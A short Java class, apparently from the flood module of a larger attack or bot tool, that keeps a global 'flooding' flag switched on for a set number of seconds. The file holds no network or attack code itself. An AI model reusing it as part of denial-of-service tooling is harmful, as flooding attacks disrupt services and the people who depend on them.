package com.redpois0n.flood;

import com.redpois0n.Constants;

public class FloodTime extends Thread {

	public int time;

	public FloodTime(int i) {
		time = i;
	}

	public void run() {
		Constants.flooding = true;
		try {
			Thread.sleep(Long.parseLong((time * 1000) + ""));
		} catch (Exception e) {
			e.printStackTrace();
		}
		Constants.flooding = false;
	}

}
